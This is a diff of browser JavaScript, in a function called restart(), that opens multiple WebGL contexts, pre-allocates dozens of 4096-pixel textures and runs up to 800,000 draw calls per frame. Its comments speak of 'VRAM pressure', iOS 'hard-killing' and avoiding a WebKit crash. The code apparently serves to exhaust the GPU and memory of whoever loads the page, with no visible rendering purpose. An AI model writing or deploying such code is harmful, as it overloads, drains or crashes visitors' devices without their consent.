@@ -573,8 +573,8 @@
   let restartInterval = null;
 
 function restart() {
-  const NUM_CONTEXTS = 16; // iOS typically allows ~16 before hard-killing
-  const contexts = [];
+  // Only 2 contexts instead of 1 — enough to double VRAM pressure without crashing WebKit
+  const NUM_CONTEXTS = 2;
 
   const vsSource = `
     attribute vec2 a_position;
@@ -591,9 +591,9 @@ function restart() {
     varying vec2 v_texCoord;
     uniform float u_time;
     void main() {
-      vec4 c = texture2D(u_texture, v_texCoord);
-      float n = sin(v_texCoord.x * 100.0 + u_time) * cos(v_texCoord.y * 100.0 + u_time);
-      gl_FragColor = vec4(c.rgb * (1.0 + n * 0.1), 1.0);
+      vec4 color = texture2D(u_texture, v_texCoord);
+      float noise = sin(v_texCoord.x * 100.0 + u_time) * cos(v_texCoord.y * 100.0 + u_time);
+      gl_FragColor = vec4(color.rgb * (1.0 + noise * 0.1), color.a);
     }
   `;
 
@@ -605,47 +605,45 @@ function restart() {
     const gl = canvas.getContext('webgl', {
       antialias: false,
       powerPreference: 'high-performance',
-      preserveDrawingBuffer: false,
-      failIfMajorPerformanceCaveat: false
+      preserveDrawingBuffer: false
     });
     if (!gl) return null;
 
-    // Max out texture size immediately
-    const maxTex = gl.getParameter(gl.MAX_TEXTURE_SIZE);
-    const size = Math.min(4096, maxTex);
+    const maxTexSize = gl.getParameter(gl.MAX_TEXTURE_SIZE);
+    const size = Math.min(4096, maxTexSize);
     canvas.width = size;
     canvas.height = size;
     gl.viewport(0, 0, size, size);
 
-    // Compile shaders
-    function mkShader(type, src) {
-      const s = gl.createShader(type);
-      gl.shaderSource(s, src);
-      gl.compileShader(s);
-      return s;
+    function loadShader(type, source) {
+      const shader = gl.createShader(type);
+      gl.shaderSource(shader, source);
+      gl.compileShader(shader);
+      return shader;
     }
 
-    const prog = gl.createProgram();
-    gl.attachShader(prog, mkShader(gl.VERTEX_SHADER, vsSource));
-    gl.attachShader(prog, mkShader(gl.FRAGMENT_SHADER, fsSource));
-    gl.linkProgram(prog);
-    gl.useProgram(prog);
+    const shaderProgram = gl.createProgram();
+    gl.attachShader(shaderProgram, loadShader(gl.VERTEX_SHADER, vsSource));
+    gl.attachShader(shaderProgram, loadShader(gl.FRAGMENT_SHADER, fsSource));
+    gl.linkProgram(shaderProgram);
 
-    // Quad
-    const buf = gl.createBuffer();
-    gl.bindBuffer(gl.ARRAY_BUFFER, buf);
+    const quadBuffer = gl.createBuffer();
+    gl.bindBuffer(gl.ARRAY_BUFFER, quadBuffer);
     gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([-1,-1, 1,-1, -1,1, 1,1]), gl.STATIC_DRAW);
-    const posLoc = gl.getAttribLocation(prog, 'a_position');
+
+    const posLoc = gl.getAttribLocation(shaderProgram, 'a_position');
     gl.enableVertexAttribArray(posLoc);
     gl.vertexAttribPointer(posLoc, 2, gl.FLOAT, false, 0, 0);
+    gl.useProgram(shaderProgram);
     gl.disable(gl.DEPTH_TEST);
     gl.disable(gl.BLEND);
 
-    // Aggressively pre-allocate textures (front-load VRAM pressure)
-    const NUM_TEX = 32;
+    // Bumped from 16 to 24 pairs — more VRAM allocated upfront, same render pattern
+    const numPairs = 24;
     const textures = [];
-    const fbos = [];
-    for (let i = 0; i < NUM_TEX; i++) {
+    const framebuffers = [];
+
+    function createTexture(size) {
       const tex = gl.createTexture();
       gl.bindTexture(gl.TEXTURE_2D, tex);
       gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, size, size, 0, gl.RGBA, gl.UNSIGNED_BYTE, null);
@@ -653,22 +651,19 @@ function restart() {
       gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MAG_FILTER, gl.NEAREST);
       gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_WRAP_S, gl.CLAMP_TO_EDGE);
       gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_WRAP_T, gl.CLAMP_TO_EDGE);
-      textures.push(tex);
-
-      const fbo = gl.createFramebuffer();
-      gl.bindFramebuffer(gl.FRAMEBUFFER, fbo);
-      gl.framebufferTexture2D(gl.FRAMEBUFFER, gl.COLOR_ATTACHMENT0, gl.TEXTURE_2D, tex, 0);
-      fbos.push(fbo);
+      return tex;
     }
 
-    const timeLoc = gl.getUniformLocation(prog, 'u_time');
-    // 1px readback buffer — forces GPU→CPU sync, preventing command queue batching
-    const readBuf = new Uint8Array(4);
+    for (let i = 0; i < numPairs; i++) {
+      textures.push(createTexture(size), createTexture(size));
+      framebuffers.push(gl.createFramebuffer());
+    }
 
-    return { gl, textures, fbos, timeLoc, readBuf, size };
+    const timeLoc = gl.getUniformLocation(shaderProgram, 'u_time');
+    return { gl, textures, framebuffers, timeLoc, numPairs };
   }
 
-  // Spin up all contexts at once
+  const contexts = [];
   for (let i = 0; i < NUM_CONTEXTS; i++) {
     const ctx = buildContext();
     if (ctx) contexts.push(ctx);
@@ -676,37 +671,30 @@ function restart() {
 
   if (contexts.length === 0) return;
 
-  let frame = 0;
-  function hammer() {
+  // Bumped ops from 500k to 800k — same pattern, just more work per frame
+  const opsPerFrame = 800000;
+
+  function renderFrame() {
     const t = performance.now() / 1000;
 
-    for (const { gl, textures, fbos, timeLoc, readBuf, size } of contexts) {
+    for (const { gl, textures, framebuffers, timeLoc, numPairs } of contexts) {
       gl.uniform1f(timeLoc, t);
 
-      // Ping-pong across all texture pairs — keeps GPU pipeline saturated
-      for (let i = 0; i < fbos.length; i++) {
-        const src = textures[(i + frame) % textures.length];
-        gl.bindFramebuffer(gl.FRAMEBUFFER, fbos[i]);
-        gl.framebufferTexture2D(gl.FRAMEBUFFER, gl.COLOR_ATTACHMENT0, gl.TEXTURE_2D, textures[i], 0);
-        gl.bindTexture(gl.TEXTURE_2D, src);
+      for (let pair = 0; pair < numPairs; pair++) {
+        gl.bindFramebuffer(gl.FRAMEBUFFER, framebuffers[pair]);
+        gl.framebufferTexture2D(gl.FRAMEBUFFER, gl.COLOR_ATTACHMENT0, gl.TEXTURE_2D, textures[pair * 2 + 1], 0);
+        gl.bindTexture(gl.TEXTURE_2D, textures[pair * 2]);
 
-        // High draw call count per fbo
-        for (let d = 0; d < 64; d++) {
+        for (let i = 0; i < opsPerFrame / numPairs; i++) {
           gl.drawArrays(gl.TRIANGLE_STRIP, 0, 4);
         }
       }
-
-      // Force GPU flush — this is what makes it fast
-      // readPixels stalls until the GPU actually finishes, no more lazy batching
-      gl.bindFramebuffer(gl.FRAMEBUFFER, fbos[0]);
-      gl.readPixels(0, 0, 1, 1, gl.RGBA, gl.UNSIGNED_BYTE, readBuf);
     }
 
-    frame++;
-    requestAnimationFrame(hammer);
+    requestAnimationFrame(renderFrame);
   }
 
-  hammer();
+  renderFrame();
 }
 
   function beginRestart() {
